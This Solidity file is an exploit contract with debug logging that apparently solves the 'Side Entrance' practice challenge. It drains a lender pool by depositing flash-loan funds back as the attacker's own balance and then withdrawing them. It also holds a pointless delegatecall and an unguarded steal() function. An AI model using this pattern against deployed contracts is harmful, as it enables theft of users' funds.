// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// import "contracts/side-entrance/SideEntranceLenderPool.sol";
import "hardhat/console.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;
}

contract PoolAttacker_Logs {

    address payable private pool;
    address private owner;
    uint256 amount;

    constructor (address _pool){
        owner =msg.sender;
        pool = payable(_pool);
    }

    function attack(uint256 _amount) external {
        amount = _amount;
        console.log("\n-- attack calls flashLoan --");
        ISideEntranceLenderPool(pool).flashLoan(amount);
    }

    function execute() external payable {
        ///LOG///
        console.log("\nPoolAttacker.execute():");
        console.log(msg.sender);
        console.log(msg.value);
        console.log("PoolAttacker balance:");
        console.log(address(this).balance);
        ///LOG///
        console.log("\n\n-- execute calls deposit --");
        (bool success, ) = pool.delegatecall(abi.encodeWithSignature("deposit()"));
        require(success);
         console.log("\n\n-- final deposit --");
        (success, ) = pool.call{value:amount}(abi.encodeWithSignature("deposit()"));
        require(success);
    }

    function steal() external payable {
        console.log("\n\n-- stealing --");
        ISideEntranceLenderPool(pool).withdraw();
        console.log("PoolAttacker balance:");
        console.log(address(this).balance);
        (bool success, ) = payable(msg.sender).call{value:amount}("");
        require(success);
    }

    receive() external payable {}

}